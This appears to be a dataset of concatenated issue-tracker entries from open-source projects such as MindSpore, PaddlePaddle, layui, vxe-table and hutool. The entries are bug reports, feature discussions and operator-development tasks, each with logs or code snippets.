Cascader 级联组件的扩展思考,1.在数据格式上可以支持 全部层级 和 最后一层 的格式，比如 一级/二级/二级 或 直接三级 2.思考：级联组件是否有必要去支持 多选 和 单选 如果支持 是否 和 treeSelect 的功能重复 ？ 假设支持： 这个假设并不全面，还有很多需要考虑 Cascader 组件的应用场景扩展 待讨论 @0o张不歪o0 @morning-star   <code>: 单选的 v-model 值的形式 string 多选的 v-model 值的形式 string[]
"[ST][Doc][LSTM+CRF实现序列标注][win]ShapeJoinLogging] Shape Join Failed: shape1 = (3,3), shape2 = (3)","LSTM+CRF实现序列标注网络教程在windows环境graph模式训练报CRITICAL错误 教程地址：https://www.mindspore.cn/tutorials/application/zh-CN/master/nlp/sequence_labeling.html / 硬件环境: /device CPU(win) : -- MindSpore version :r2.0 commit_id:8edb949d -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20221017 MindSpore 版本：编译时间20221117121602 r2.0 commit_id:8edb949d (/): /mode graph test_ms_tutorial_nlp_lstm_crf_sequence_labeling_0001.py cd solution_test/cases/03subject_test/06document/02network_cases pytest -s test_ms_tutorial_nlp_lstm_crf_sequence_labeling_0001.py 教程网络训练成功 走给吕昱峰   <code>: INFO 2022-11-18 19:04:48 - test_ms_tutorial_nlp_lstm_crf_sequence_labeling_0001 - test_ms_tutorial_nlp_lstm_crf_sequence_labeling_0001.py:test_run:129 - exec_log: [WARNING] ME(4792:4040,MainProcess):2022-11-18-19:03:55.132.671 [mindspore\run_check\_check_version.py:500] Pre-Load Lirary libgomp.so.1 failed, this might cause cannot allocate TLS memory problem, if so find solution in FAQ in https://www.mindspore.cn/docs/en/master/faq/installation.html. 0%| | 0/500 [00:00&lt;?, ?it/s][WARNING] DEBUG(4792,1,?):2022-11-18 19:3:56 [mindspore\ccsrc\common\debug\rdr\recorder_manager.cc:43] UpdateRdrEnable] The RDR only supports linux os currently. [CRITICAL] CORE(4792,1,?):2022-11-18 19:3:58 [mindspore\core\abstract\abstract_value.cc:76] ShapeJoinLogging] Shape Join Failed: shape1 = (3, 3), shape2 = (3). For more details, please refer to https://www.mindspore.cn/search?inputValue=Shape%20Join%20Failed Inner Message: This: AbstractRefTensor(key: crf.transitions ref_value: AbstractRefTensor(shape: (3, 3), element: AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape), value_ptr: 0xe8b7c21af0, value: AnyValue), value: AnyValue), other: AbstractRefTensor(key: hidden2tag.bias ref_value: AbstractRefTensor(shape: (3), element: AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape), value_ptr: 0xe8b7c21af0, value: AnyValue), value: AnyValue) [CRITICAL] CORE(4792,1,?):2022-11-18 19:3:58 [mindspore\core\abstract\abstract_value.cc:76] ShapeJoinLogging] Shape Join Failed: shape1 = (3, 3), shape2 = (3). For more details, please refer to https://www.mindspore.cn/search?inputValue=Shape%20Join%20Failed Inner Message: This: AbstractRefTensor(key: crf.transitions ref_value: AbstractRefTensor(shape: (3, 3), element: AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape), value_ptr: 0xe8b7c21af0, value: AnyValue), value: AnyValue), other: AbstractRefTensor(key: hidden2tag.bias ref_value: AbstractRefTensor(shape: (3), element: AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape), value_ptr: 0xe8b7c21af0, value: AnyValue), value: AnyValue) [CRITICAL] CORE(4792,1,?):2022-11-18 19:3:58 [mindspore\core\abstract\abstract_value.cc:76] ShapeJoinLogging] Shape Join Failed: shape1 = (3, 3), shape2 = (3). For more details, please refer to https://www.mindspore.cn/search?inputValue=Shape%20Join%20Failed Inner Message: This: AbstractRefTensor(key: crf.transitions ref_value: AbstractRefTensor(shape: (3, 3), element: AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape), value_ptr: 0xe8b7c21af0, value: AnyValue), value: AnyValue), other: AbstractRefTensor(key: hidden2tag.bias ref_value: AbstractRefTensor(shape: (3), element: AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape), value_ptr: 0xe8b7c21af0, value: AnyValue), value: AnyValue) [CRITICAL] CORE(4792,1,?):2022-11-18 19:3:58 [mindspore\core\abstract\abstract_value.cc:76] ShapeJoinLogging] Shape Join Failed: shape1 = (3, 3), shape2 = (3). For more details, please refer to https://www.mindspore.cn/search?inputValue=Shape%20Join%20Failed"
[MS][Ascend] 在construct中使用int()函数报错,"在construct中，我们获取x的shepe为（bs，N，c），其中 N = 50，我们希望获得 N 的开平方数，即 H = int(N ** 0.5) = 7, 但是该操作会导致报错，报错信息为： Create python object failed, only support create Cell or Primitive object. 请问，如果要获取 H 的值，在construct中应如何实现？ 以及在construct中创建常量或张量有无需要注意的点 / 硬件环境: Ascend-910 CPU：192 核 720GiB /device ascend/GPU/CPU/kirin/等其他芯片 : MindSpore-1.3.0-c78-python3.7-euleros2.8-aarch64 (/): /mode pynative /mode graph 能够在construct中实现问题中的表述，即可以获取int(N**0.5)   <code>: &lt;class 'int'&gt;"
[GraphKernel] Attribute maybe attached with unexpected case.,: /device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : Call to attach attribute to a node. Attribute maybe attached to multiply nodes. Attribute is only attached to one node.   <code>: AnfAlgo::SetNodeAttr
How to use pre-commit?,"I see that in the current document there describes how to install pre-commit, but nothing about how to run it? Is this because that would trigger the checks and we don't need to run pre-commit manually? I vaguely remember that we might need to manually run it as ?   <code>: git commit pre-commit run -a"
取消路由后缀（.html）无法上传,"config/route.php 出现： /public/index.php/admin/api.upload?.js   <code>: 'url_html_suffix' =&gt; 'html', 'url_html_suffix' =&gt; '', 控制器不存在:app\admin\controller\Api"
curd overHidden 不生效，是什么问题？,"设置overHidden=true，没显示省略号，是什么问题？？ 现象截图： 不设置minWidth，也是一样的   <code>: { label: this.$t('withdraw.aaaa'), prop: ""aaaa"", overHidden: true, minWidth: '135', search:false, }, { label: this.$t('withdraw.bbbb'), prop: ""bbbb"", minWidth: '135', overHidden: true, search:false, },"
`LayerHelper`没有对应的文档？,"希望可以尽快完善   <code>: from paddle.fluid.layer_helper import LayerHelper LayerHelper?? Init signature: LayerHelper(layer_type, **kwargs) Docstring: &lt;no docstring&gt;"
$('#dataGrid').dataGrid({})初始化设置不查询,"$('#dataGrid').dataGrid({})初始化 设置 datatype:'local', 就不会初始化查询， 但是重新加载缺不成功，和jqGrid重新加载命名不一样 网上案例： 后面加载数据时： 请问$('#dataGrid').dataGrid({}) 该怎么初始化   <code>: $(""#gridMaterial"").setGridParam({ datatype: 'json', url: ""/ajaxAshx/publicAjax/Material.ashx"", postData: { myOpt: ""GetMaterial"", opCode: opCode, PersonId: personId, recordKey: recordKey } }).trigger(""reloadGrid"");"
Fix slow parsing a recursive depends topology,"Fix #2797:go_binary: remove hardcoded library link path, add pserver client test It because trainer_config_helpers' dfs_travel did not record the node which travelled, and if the topology has a recursive dependency, there are some nodes will be travelled multiple times. Add a set to record which node is travelled. Also add a unittest for this situation.   <code>: travelled"
【众智】【计算-AICPU开发】MatrixExp,MatrixExp AICPU算子适配 + functional接口 + CPU算子迁移 + 算子反向 计算MatrixExp函数。 functional接口（小写加下划线） 接口目录：mindspore/python/mindspore/ops/function/math_func.py 算子原语 接口目录：mindspore/python/mindspore/ops/operations/math_ops.py x y 对应底层算子 对应底层AI CPU算子MatrixExp Classify Name Type TypeRange Required Doc AttrDefault INPUT x BasicType TRUE OUTPUT y BasicType TRUE PyTorch1.8.1接口： torch.sinc https://pytorch.org/docs/1.8.1/generated/torch.matrix_exp.html 3. 异常处理 4. 算子反向 参考torch 的 matrix_exp_backward   <code>: def matrix_exp(x: tensor) -&gt; tensor: return y class MatrixExp(Primitive):
Recordio cloud and local interface,Fix https://github.com/PaddlePaddle/Paddle/issues/2637 同时，在返回值上增加errno以便区分是还是。   <code>: EOF error
无法展开行,"问题一 我参考了 demo 的展开按扭, 做了一个展开收缩按扭, 但是确没效果 问题二 莫名奇妙来了个乱七八糟的名字 row_6 怎么出来的 问题三 当数据变更时, 没有默认展开所有, 我配置了 expendAll = true 不要来乱七八糟的名字, 可以正常展开, 数据变更时可以正常展开所有 OS: windows 10 Browser: chrome 77.0 vue: 2.6 vxe-table: 3.5.8   <code>: &lt;vxe-table size=""mini"" border resizable row-id=""path"" :data=""diffChangeTree"" :loading=""loading"" ref=""diffChangeTree"" :tree-config=""{expandAll: true, accordion: true, line: true}""&gt; &lt;vxe-column type=""checkbox"" :width=""dynamicTreeTableWidth"" title=""路径"" tree-node&gt; &lt;template #header=""{row}""&gt; 路径 &lt;el-button-group&gt; &lt;el-button size=""small"" type=""text"" icon=""el-icon-plus"" @click=""$refs.diffChangeTree.setAllTreeExpand(true)"" /&gt; &lt;el-button size=""small"" type=""text"" icon=""el-icon-minus"" @click=""$refs.diffChangeTree.clearTreeExpand()"" /&gt; &lt;/el-button-group&gt; &lt;/template&gt; &lt;template #default=""{row}""&gt; &lt;template v-if=""row.changeType === 'ADD'""&gt; &lt;span class=""text-forestgreen""&gt;{{row.fileName}}&lt;/span&gt; &lt;/template&gt; &lt;template v-if=""row.changeType === 'MODIFY'""&gt; &lt;span class="""" style=""color: #0097fb""&gt;{{row.fileName}}&lt;/span&gt; &lt;/template&gt; &lt;template v-if=""row.changeType === 'DELETE'""&gt; &lt;span class="""" style=""color: #8d8888""&gt;&lt;s&gt;{{row.fileName}}&lt;/s&gt;&lt;/span&gt; &lt;/template&gt; &lt;template v-if=""!!!row.changeType""&gt; &lt;template v-if=""row.module""&gt; &lt;span class=""text-bold""&gt;&lt;i class=""el-icon-pie-chart""&gt;&lt;/i&gt; {{row.path}}&lt;/span&gt; &lt;/template&gt; &lt;template v-else&gt;&lt;span class=""text-bold""&gt;{{row.path}}&lt;/span&gt;&lt;/template&gt; &lt;el-tag class=""margin-left"" effect=""dark"" size=""mini"" type=""info""&gt;{{row.fileCount}} files&lt;/el-tag&gt; &lt;/template&gt; &lt;/template&gt; &lt;/vxe-column&gt; &lt;vxe-column width=""250"" title=""操作"" fixed=""right""&gt; &lt;template #default=""{row}""&gt; &lt;!-- 文件类型 --&gt; &lt;template v-if=""row.changeType""&gt; &lt;template v-if=""row.changeType !== 'DELETE'""&gt; &lt;el-button type=""text"" v-if=""row.fileName.toLowerCase().endsWith('java')"" size=""small"" @click=""javac([row.treeFilePath])""&gt;javac&lt;/el-button&gt; &lt;el-button type=""text"" size=""small"" @click=""downloadSource([row.treeFilePath])""&gt;下载&lt;/el-button&gt; &lt;/template&gt; &lt;template v-else&gt; &lt;span&gt;占位&lt;/span&gt; &lt;/template&gt; &lt;/template&gt; &lt;template v-else&gt; &lt;template v-if=""row.module""&gt; &lt;el-tooltip :content=""'上次获取时间:' + (row.classpathResolveTime ? parseTime(row.classpathResolveTime) : '未获取')"" placement=""top""&gt; &lt;el-button type=""text"" size=""small"" @click=""resolveJars(row.treeFilePath)"" &gt;classpath&lt;/el-button&gt; &lt;/el-tooltip&gt; &lt;el-tooltip :content=""'上次编译时间:'+(row.lastCompileTime ? parseTime(row.lastCompileTime) : '未编译')""&gt; &lt;el-button type=""text"" size=""small"" @click=""execMavenGoals(row.treeFilePath,['clean','compile'])""&gt;compile&lt;/el-button&gt; &lt;/el-tooltip&gt; &lt;el-button type=""text"" size=""small"" @click=""execMavenGoals(row.treeFilePath,['clean','package'])""&gt;package&lt;/el-button&gt; &lt;!-- &lt;el-button type=""text"" size=""small""&gt;批量编译&lt;/el-button&gt;--&gt; &lt;el-button type=""text"" size=""small"" @click=""downloadSource([row.treeFilePath])""&gt;下载&lt;/el-button&gt; &lt;/template&gt; &lt;template v-else&gt; &lt;el-button type=""text"" size=""small"" @click=""batchJavac(row)""&gt;批量编译&lt;/el-button&gt; &lt;el-button type=""text"" size=""small"" @click=""downloadSource([row.treeFilePath])""&gt;下载&lt;/el-button&gt; &lt;/template&gt; &lt;/template&gt; &lt;/template&gt; &lt;/vxe-column&gt; &lt;/vxe-table&gt;"
[BUG][MD][DOC]C++ Doc transforms：Example syntex Errors,: /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 1． Example列子在mindspore中编译 2． 报错 有问题的例子如下： 用例正常执行   <code>: transforms::Concatenate transforms::Mask
avue 和Element都给上全局size 表格样式会很奇怪,"代码： 效果：（ ** 每一行的高度很高，字很小，而且字不在高度中间 ** ）   <code>: Vue.use(Element, { size: 'small', i18n: (key, value) =&gt; i18n.t(key, value) }) Vue.use(window.AVUE, { size: 'small', tableSize: 'small', calcHeight: -80, i18n: (key, value) =&gt; i18n.t(key, value) })"
layers.reverse gets unexpected behavior with negative axis,"Thank you for contributing to PaddlePaddle. Before submitting the issue, you could search issue in the github in case that there was a similar issue submitted or resolved before. If there is no solution,please provide us with the following details : System information -PaddlePaddle version 2019/12/19 develop -GPU: cuda 10.1 / cudnn 7.5 -OS Platform and DistributionL ubuntu 16.04LTS -Python version 3.7.4 reproduce: output: expected ouput: When I use axis=1, I get the expected behavior.   <code>: import numpy as np from paddle import fluid import paddle.fluid.layers as F import paddle.fluid.dygraph as dg x = np.reshape(np.arange(20), (4, 5)).astype(np.float32) print(x) place = fluid.CPUPlace() with dg.guard(place): x_var = dg.to_variable(x) y_var = F.reverse(x_var, axis=-1) y_np = y_var.numpy() print(y_np) [[ 0. 1. 2. 3. 4.] [ 5. 6. 7. 8. 9.] [10. 11. 12. 13. 14.] [15. 16. 17. 18. 19.]] [[ 0. 1. 2. 3. 4.] [ 5. 6. 7. 8. 9.] [10. 11. 12. 13. 14.] [15. 16. 17. 18. 19.]] [[ 0. 1. 2. 3. 4.] [ 5. 6. 7. 8. 9.] [10. 11. 12. 13. 14.] [15. 16. 17. 18. 19.]] [[ 4. 3. 2. 1. 0.] [ 9. 8. 7. 6. 5.] [14. 13. 12. 11. 10.] [19. 18. 17. 16. 15.]]"
MindX - MindSpore,"MindX - MindSpore MxBase libmindspore_plugin.so libmxbase.so MindSporeLoader MxPlugin 预处理 / 后处理，似乎用MindX现有的也行，先试试能不能用 MxPiModelInfer 新增options mindir / om区分 aipp文件路径 精度选项等 流程控制   <code>: // execute class Tensor { public: ~Tensor() = 0; std::string Name() const = 0; enum DataType DataType() const = 0; const std::vector&lt;int64_t&gt; &amp;Shape() const = 0; int64_t ElementNum() const = 0; std::shared_ptr&lt;const void&gt; Data() const = 0; void *MutableData() = 0; size_t DataSize() const = 0; } class Model = 0; class Context = 0; extern ""C"" { Tensor *CreateTensor(const char *name, DataType type, int64_t[] shape, uint64_t shape_size, const void *data, uint64_t data_len); Model *LoadMindir(const char *file, Context *model_context); Context *CreateContext(); void InitGlobalContext(uint32_t device_id); } // minddata class Execute = 0; class TensorOperation = 0; extern ""C"" { Execute *CreateExecute(TensorOperation[] ops, uint64_t ops_size); TensorOperation *CreateDvppOp(uint64_t[] resize_option, uint64_t resize_option_size, uint64_t[] crop_option, uint64_t crop_option_size); } class MindSporeLoader { public: static MindSporeLoader&amp; Instance(); bool Init(uint32_t device_id); // dlopen libmindspore_plugin.so void Finalize(); // dlclose uint32_t InitModel(const std::string &amp;file, const std::map&lt;std::string, std::string&gt; &amp;options); // return model id bool ModelInference(uint32_t model_id, const std::vector&lt;std::shared_ptr&lt;Tensor&gt;&gt; &amp;inputs, std::vector&lt;std::shared_ptr&lt;Tensor&gt;&gt; *outputs); ModelDesc GetModelDesc(uint32_t model_id); } if (om) { MxBase::ModelInfer ... } else if (mindir) { MxBase::MindSporeLoader ... } else { ERROR }"
[CT][MS][SetSize] SetSize 在异常用例场景中 报错信息提示错误,"在cpu 后端 两种模式下 运行用例 test_setsize_set_values_is_none 结果报 valueerror 应该是报 typeerror def test_setsize_set_values_is_none(): set_shape_list = [] for i in range(3): set_shape_list.append(random.randint(2, 5)) set_shape = Tensor(np.array(set_shape_list).astype(np.int64)) max_values_num = set_shape[0] * set_shape[1] * set_shape[2] values_num = np.random.randint(2, max_values_num, size=(1)) set_values = None set_indices = Tensor(np.array(gen_indices_data_file([values_num, 3], set_shape)).astype(np.int64)) test_setsize_disorder_indices D 异常用例捕获typeerror 用例通过   <code>: fact = SetSizeMock(inputs=[set_indices, set_values, set_shape]) with pytest.raises((TypeError)): fact.forward_mindspore_impl() fact = SetSizeMock(attributes={""validate_indices"": True}, inputs=[Tensor(set_indices), Tensor(set_values), Tensor(set_shape)]) with pytest.raises((ValueError)): fact.forward_mindspore_impl()"
Remove -S build option,RFC Data dump feature is not enable by . Remove -S build option. Build data dump feature by default. Trail No. Task Description Related Issue(URL) 1 2   <code>: bash build.sh -ed
Fluid benchmark ,"In the 0.11.0 version, we will release the book chapters written with , there are some tasks need to be done. Task Lists 1 : compare results with Paddle books V2 Need to validate these books can convergence to the approximate same result with books chapters. book.03 image classification CPU loss validation @jacquesqiao @qingqing01 @vkuke book.03 image classification GPU loss validation @jacquesqiao @qingqing01 @vkuke ResNet VGG book.04 word2vec CPU loss validation @peterzhang2029 book.04 word2vec GPU loss validation @peterzhang2029 book.05 recommendation systems CPU loss validation @typhoonzero book.05 recommendation systems GPU loss validation @typhoonzero Need to note that we have three different implementation of understand_sentiment, only test the lstm one in this chapter. book.06 understand_sentiment lstm CPU loss validation @ranqiu92 book.06 understand_sentiment lstm GPU loss validation @ranqiu92 book.07 label semantic roles CPU loss validation @chengduozh We do not have GPU version label semantic roles implementation. book.08 machine translation CPU loss validation @jacquesqiao @ChunweiYan book.08 machine translation GPU loss validation @jacquesqiao @ChunweiYan Task Lists How to do We have benchmark scripts and docker image. So these things should be done quickly and report a bug if you find any issue. (operator implement, convergence result). Because we are still finetuning the performance, so if you find any magnitude gap in performance, please file an issue without hesitation. scripts are put under this directory, please find the correct chapter name: https://github.com/PaddlePaddle/Paddle/blob/develop/python/paddle/v2/fluid/tests/book old books docker image: paddlepaddle/book:latest-gpu new books docker image: dzhwinter/benchmark:latest   <code>: fluid"
Upgrade to cuda9:cudnn7,"This PR is an effort of upgrading to cuda9:cudnn7. Major Blocker: compiler evicts tons of warnings, it needs to be solved: find a way to suppress those warnings. Need a more uniformed way to use Eigen.   <code>: nvcc cuda9"
在文件上传中使用Oops.Oh抛出错误会报错,"Furion 版本号 3.7.3源码（在项目文件里找到的版本号）,nuget安装的包不知道为什么有时会出现swagger文档出错，把代码搬到新建的项目又正常了，搞了两次直接下源码了 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 在文件上传中使用Oops.Oh抛出错误会报错,使用throw new Exception(""文件不允许"")，就正常报错 返回结果： #Msg# Message:The type initializer for 'Furion.FriendlyException.Oops' threw an exception.\r\n StackTrace: at Furion.FriendlyException.Oops.Oh(Object errorCode, Object[] args) in ***\Furion\Furion.Pure\FriendlyException\Oops.cs:line 117 at JSFW_Api.Application.FileController.UploadAsync(IFormFile file, String fid, String type) in ***\JSFW_Api.Application\Controller\common\FileController.cs:line 58 at lambda_method9(Closure , Object ) at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.AwaitableObjectResultExecutor.Execute(IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State&amp; next, Scope&amp; scope, Object&amp; state, Boolean&amp; isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.g__Awaited|26_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)\r\n 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos   <code>: /// &lt;summary&gt; /// 文件上传 /// &lt;/summary&gt; /// &lt;param name=""file""&gt;&lt;/param&gt; /// &lt;param name=""fid""&gt;业务id&lt;/param&gt; /// &lt;param name=""type""&gt;类型，根据此项查不同表&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; [HttpPost] [AllowAnonymous] //[RequestSizeLimit(100_000_000)] [DisableRequestSizeLimit] public async Task&lt;string&gt; UploadAsync(IFormFile file, string fid, string type) { // 如：保存到网站根目录下的 uploads 目录 var savePath = Path.Combine(App.HostEnvironment.ContentRootPath, ""uploads"", DateTime.Now.ToString(""yyyyMMdd"")); if (!Directory.Exists(savePath)) Directory.CreateDirectory(savePath); //// 这里还可以获取文件的信息 if(ApiSetting.Instance.FileUploadSize &lt; file.Length) { throw Oops.Oh(FileErrorCode.FileSizeExceeded); } //var size = file.Length / 1024.0; // 文件大小 KB var clientFileName = file.FileName; // 客户端上传的文件名 if (!UploadConfig.CheckFileType(clientFileName)) //文件不允许 { throw Oops.Oh(FileErrorCode.FileTypeNotAllow); //throw new Exception(""文件不允许""); } //var contentType = file.ContentType; // 获取文件 ContentType 或解析 MIME 类型 // 避免文件名重复，采用 GUID 生成 var fileName = Guid.NewGuid().ToString(""N"") + Path.GetExtension(file.FileName); var filePath = Path.Combine(savePath, fileName); // 保存到指定路径 using (var stream = System.IO.File.Create(filePath)) { await file.CopyToAsync(stream); } // 在动态 API 直接返回对象即可，无需 OK 和 IActionResult return savePath; } { ""statusCode"": 500, ""data"": null, ""succeeded"": false, ""errors"": ""An item with the same key has already been added. Key: Error"", ""extras"": null, ""timestamp"": 1657853976348 }"
获取搜索条件中有多选时 ，多选无效。,"获取搜索条件中有多选时 ，只取最后一个。   <code>: // 获取form下所有的字段并转换为json对象 formToJSON: function(formId) { var json = {}; $.each($(""#"" + formId).serializeArray(), function(i, field) { json[field.name] = field.value; }); return json; }"
xpath ,"这么改下就可以了   <code>: public static void main(String[] args) { String source = ""&lt;div&gt;&lt;/div&gt;&lt;div class=\""content_1YWBm\""&gt;&lt;a&gt;&lt;div&gt;要获取的&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/div&gt;""; String xpath = StringFunctionExtension.xpath(source, ""//*[@class=\""content_1YWBm\""]/a/div/text()""); String xpath1 = StringFunctionExtension.xpath(source, ""//div[2]/a/div[1]/text()""); System.out.println(xpath); System.out.println(xpath1);// 应该也能获取到值，然而没有"
【众智】【计算-AICPU开发】Equal,"AICPU算子开发 是否相等 x y output 对应底层算子 对应底层AI CPU算子Equal Classify Name Type Type Range Required Format INPUT x1 fp16, fp32, double, int8, int16, int32, int64, uint8, quint8, qint8, qint32, string, bool, complex64, complex128 TRUE INPUT x2 fp16, fp32, double, int8, int16, int32, int64, uint8, quint8, qint8, qint32, string, bool, complex64, complex128 TRUE OUTPUT y bool TRUE 标杆接口参考 TF接口： https://www.tensorflow.org/api_docs/python/tf/raw_ops/Equal 3. 异常处理 4. 算子反向 库上已实现   <code>: class Equal(_LogicBinaryOp):"
shell node的script发送给worker保持和用户输入的一致,"目前shell node的脚本再发送到worker之前会有输出日志,这是在server端加的,但是在一些场景会有bug,例如如下script: 原本是执行两次,但是server会变成如下脚本: 这会导致执行了三次,而且输出的日志也和用户的脚本不一致,希望server不要加echo来输出调试.   <code>: ls &amp;&amp; ls ls echo ls &amp;&amp; ls ls &amp;&amp; ls ls"
过滤器AuthFilter里注入远程调用服务报错,在AuthFilter.java里，注入内部远程服务 启动时报错   <code>: @Autowired private RemoteFileService remoteFileService; Consider defining a bean of type 'XXX.RemoteFileService' in your configuration.
"table 设置height: ""full-200""，是否可以让其table高度可以自适应","版本：在此处填写您所使用的 Layui 版本号 v2.7.6 描述：在此处填写尽可能详细的问题描述和具体操作步骤等信息 table组件设置了height：'full-200'时,当数据为空或者数据量少的时候下方会有很大的空白部分，怎么让它自适应高度，当数据量多了，设置的这个height为max-height 在此处填写与问题对应的业务代码（可选）   <code>: table.render({ elem: '#LAY-app-list', id: 'table-demo', url: U.GET, height: 'full-200', limit: 50, limits:[50,100], cols: [[{title:'顺序',type:'numbers',width:'6%',align:'center',fixed:'left'}, {field:'name',title:'产品名称',width:'15%',align:'center',fixed:'left'}, {title:'操作',minWidth:100,align:'center',fixed:'right',toolbar:'#table-list'} ]], page: true, done:function(res, curr, count) {}, })"
静态表格转数据表格后，如果单元格嵌套html标签后，合计行失效的问题,"版本：2.7.5 描述：单元格嵌套<span></span>标签后，合计行失效   <code>: &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=""utf-8""&gt; &lt;title&gt;示例演示&lt;/title&gt; &lt;meta name=""renderer"" content=""webkit""&gt; &lt;meta http-equiv=""X-UA-Compatible"" content=""IE=edge,chrome=1""&gt; &lt;meta name=""viewport"" content=""width=device-width, initial-scale=1""&gt; &lt;!-- 注意：项目正式环境请勿引用该地址 --&gt; &lt;link href=""//unpkg.com/layui@2.7.6/dist/css/layui.css"" rel=""stylesheet""&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=""layui-btn-group demoTable"" style=""margin-bottom: 10px;""&gt; &lt;button class=""layui-btn"" data-type=""parseTable""&gt;立即转化为数据表格&lt;/button&gt; &lt;/div&gt; &lt;table lay-filter=""parse-table-demo""&gt; &lt;thead&gt; &lt;tr&gt; &lt;th lay-data=""{field:'username', width:200}""&gt;昵称&lt;/th&gt; &lt;th lay-data=""{field:'joinTime', width:150}""&gt;加入时间&lt;/th&gt; &lt;th lay-data=""{field:'sign', minWidth: 180,totalRow:true}""&gt;数量&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt;贤心1&lt;/td&gt; &lt;td&gt;2016-11-28&lt;/td&gt; &lt;td&gt;&lt;span style='color:red'&gt;123&lt;/span&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;!-- 注意：项目正式环境请勿引用该地址 --&gt; &lt;script src=""//unpkg.com/layui@2.7.6/dist/layui.js""&gt;&lt;/script&gt; &lt;script&gt; layui.use('table', function(){ var table = layui.table; var $ = layui.$, active = { parseTable: function(){ table.init('parse-table-demo', { //转化静态表格 totalRow: true, escape: false }); } }; $('.demoTable .layui-btn').on('click', function(){ var type = $(this).data('type'); active[type] ? active[type].call(this) : ''; }); }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;"
SQLManager.updateByIdBatch  空指针,"执行这个方法的时候 会空指针 追踪如下： 这行空指针,id是 发现没有这个实体的信息 BUG啊 原因是： 主键未发现,com.ly.jsdy.job.executor.entity.oracle.DanweiInfo,检查数据库表定义或者NameConversion 但实体是指定了主键的 我觉得应该兼容下这个问题 这里只取了 数据库定义了主键的情况 修复 !50:修复数据库不定义主键导致的问题   <code>: /** * 得到增删改查模板 * * @param cls clz * @param constantEnum ConstantEnum * @return SQLScript */ public SQLScript getScript(Class&lt;?&gt; cls, ConstantEnum constantEnum) { //slqId 保持与DefaultSQLIdNameConversion同样命名风格 String className = StringKit.toLowerCaseFirstOne(cls.getSimpleName()); String id = className + ""."" + constantEnum.getClassSQL(); SQLSource tempSource = this.sqlLoader.getSQL(id); if (tempSource != null) { return new SQLScript(tempSource, this); } SQLSource tempSource = this.sqlLoader.getSQL(id); dwInfo._gen_updateById @AssignID private String UUID; private TableDesc initTable(TableDesc desc){ synchronized (desc){ if(!desc.getCols().isEmpty()){ return desc ; } Connection conn=null; ResultSet rs = null; String tableName = desc.getRealTableName()!=null?desc.getRealTableName():desc.getName(); try { String catalog = desc.getCatalog(); String schema = desc.getSchema(); schema = this.getDbSchema(schema); conn = ds.getMetaData(); DatabaseMetaData dbmd = conn.getMetaData(); rs = dbmd.getPrimaryKeys(catalog,schema, tableName); dbmd.getPrimaryKeys"
jquery.ztree.core.min .js 版和jquery.ztree.core.js版的 nodeClasses 行为不一致,"setting配置如下 引用jquery.ztree.core.min .js 时 a节点 flex-column 添加失败 引用jquery.ztree.core.js 时 a节点 flex-column 添加成功，   <code>: { view: { nameIsHTML: true, nodeClasses: { add: ['flex-column'] } } }"
配置文件可支持 profile 特性,在 文件中，增加 特性。例如：可根据 与 分别配置属性。   <code>: smart.properties profile 开发环境 生产环境
DateUtil.parse解析2020-5-8 3:12:13.136错误,"JDK版本： jdk1.8.0_251 hutool版本： 5.3.7 堆栈信息 毫秒解析有问题   <code>: DateUtil.parse(""2020-5-8 4:12:26.223"") Exception in thread ""main"" cn.hutool.core.date.DateException: No format fit for date String [2020-5-8 4:12:26.223] !130"
PagerSlidingTabStrip 的疑惑,"发现这个方法没啥用呀，滑块的滚动应该是 调用invalidate()方法后 导致view重绘从而调用onDraw 来使滑块滑动。o(╯□╰)o。 没看懂这个方法是干嘛的。   <code>: /** * 滚动到指定的位置 */ private void scrollToChild(int position, int offset)"
Split send_op into fetch_vars_op and send_vars_op,"Currently, trainer would send all gradients after execution of all the backward ops, like: For the above process, send op will send all gradients until all the forward, backward ops done. But actually, we would send the after opB(backward), send after opA(backward), parallel execution of computing op and IO op would improve the performance. For another hand, current would not only do SEND, but also and , so we also need to split these into multiple Op. For sync update for async update, there is no op at the end of the process. TODO Implement , . Implement an IO threadpool to deal with Async Send. Enhancement with the async send op. Update benchmark report.   <code>: w1--&gt;opA-&gt;w2-&gt;opB-&gt;opB(backward)-&gt;w2'-&gt;opB(backward)-&gt;w1'-&gt;send(w1',w2') w2' w1' SendOp wait all send request finished receive parameters from pserver 